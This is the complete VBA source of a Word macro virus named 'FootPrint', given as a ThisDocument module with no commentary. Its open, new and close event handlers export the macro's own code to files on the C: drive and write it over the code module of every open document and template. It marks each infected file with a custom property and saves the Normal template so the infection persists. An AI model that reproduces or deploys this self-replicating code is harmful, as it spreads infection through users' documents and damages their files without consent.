   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Option Explicit
   'FootPrint
   Private Sub Document_Close()
   On Error Resume Next
   Kill "c:\footprint.$$?"
   Document_Open
   End Sub
   Private Sub Document_New()
   Document_Open
   End Sub
   Private Sub Document_Open()
   On Error Resume Next
   Dim al, aaa, ttt As String
   Dim adoc As Document
   Dim atpl As Template
   Dim CoL As Integer
   ThisDocument.VBProject.VBComponents("ThisDocument").Export "c:\footprint.$$$"
   Open "c:\footprint.$$$" For Input As #1
   Open "c:\footprint.$$1" For Output As #2
   Line Input #1, al
   Line Input #1, al
   Line Input #1, al
   Line Input #1, al
   While Not EOF(1)
       Line Input #1, al
       Print #2, al
   Wend
   Close 1
   Close 2
   For Each adoc In Documents
       aaa = adoc.FullName
       If Not adoc.CustomDocumentProperties(aaa) Then
           adoc.CustomDocumentProperties.Add Name:=aaa, LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
           CoL = adoc.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
           adoc.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
           adoc.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
       End If
   Next
   For Each atpl In Templates
       ttt = atpl.FullName
       If Not atpl.CustomDocumentProperties(ttt) Then
           atpl.CustomDocumentProperties.Add Name:=ttt, LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
           CoL = atpl.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
           atpl.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
           atpl.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
       End If
   Next
   NormalTemplate.Save
   End Sub
